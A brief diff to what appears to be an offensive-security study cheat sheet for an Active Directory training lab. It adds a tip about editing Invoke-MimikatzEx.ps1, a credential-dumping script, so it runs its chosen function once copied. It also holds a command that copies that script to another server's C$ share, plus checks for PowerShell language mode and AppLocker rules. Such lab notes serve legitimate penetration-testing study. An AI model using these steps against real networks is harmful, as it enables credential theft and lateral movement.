@@ -458,7 +458,8 @@ $ExecutionContext.SessionState.LanguageMode
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
-#### Copy item to other server
+#### Copy script to other server
+ps you can edit the script and call the method you wish so it executes, since you still cant load it in
 ```
 Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
